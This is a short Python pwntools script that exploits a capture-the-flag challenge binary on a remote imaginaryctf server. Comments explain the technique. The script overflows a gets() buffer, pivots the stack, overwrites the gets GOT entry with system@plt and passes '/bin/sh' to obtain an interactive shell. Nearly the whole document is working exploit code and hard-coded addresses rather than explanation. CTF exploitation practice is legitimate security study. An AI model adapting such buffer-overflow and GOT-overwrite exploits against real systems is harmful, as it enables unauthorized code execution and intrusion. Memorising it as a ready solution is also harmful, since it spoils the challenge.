from pwn import *
import time
#io = process("./vuln")
io = remote("ret2win.chal.imaginaryctf.org",1337)

# we can set rdi into whatever we want and call gets by:
#   0x0000000000401162 <+12>:    lea    rax,[rbp-0x40]
#   0x0000000000401166 <+16>:    mov    rdi,rax
#   0x0000000000401169 <+19>:    mov    eax,0x0
#   0x000000000040116e <+24>:    call   0x401060 <gets@plt>
#   0x0000000000401173 <+29>:    mov    eax,0x0
#   0x0000000000401178 <+34>:    leave
#=> 0x0000000000401179 <+35>:    ret

# but these instructions will cause leave to execute, and pivot the stack
# so we need to setup a new stack at 0x404000+ as well

# so we gets() into gets@got, and change it to system@plt,
# then we set rdi into a /bin/sh string, and call gets

getsGot = 0x404020
getsMain = 0x401162
systemPlt = 0x401030
ret = 0x401198

addRsp = 0x401016

io.sendline(b"A"*64 + p64(getsGot+0x40) + p64(getsMain))
time.sleep(1)

gotOverwrite = (p64(systemPlt)+b"/bin/sh\x00").ljust(0x40,b"A")
newStack  = p64(getsGot+0x8+0x40) + (p64(addRsp)+b"A"*8)*200 # stack is too small for system too execute
newStack += p64(getsMain)
io.sendline(gotOverwrite + newStack)
io.interactive()
